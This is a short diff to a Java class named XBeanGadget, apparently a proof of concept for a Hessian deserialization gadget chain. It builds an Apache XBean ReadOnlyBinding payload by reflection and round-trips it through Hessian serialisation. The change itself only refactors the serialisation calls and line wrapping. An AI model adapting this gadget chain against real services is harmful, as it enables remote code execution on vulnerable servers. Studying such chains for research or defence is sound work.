@@ -14,8 +14,8 @@ import java.util.HashMap;
 public class XBeanGadget {
     public static void main(String[] args) throws Exception {
         Object payload = getPayload();
-        byte[] bytes = HessianTools.hessian2Ser2bytes(payload);
-        HessianTools.hessian2Deser(bytes);
+        byte[] bytes = HessianTools.hessianSer2bytes(payload, "2");
+        HessianTools.hessianDeser(bytes, "2");
     }
 
     public static Object getPayload() throws Exception {
@@ -27,7 +27,8 @@ public class XBeanGadget {
 
         // 创建ReadOnlyBinding对象
         String classname = "org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding";
-        Object readOnlyBinding = Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class).newInstance("aaa", ref, writableContext);
+        Object readOnlyBinding = Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class)
+                .newInstance("aaa", ref, writableContext);
 
         XString xString = new XString("any");
 
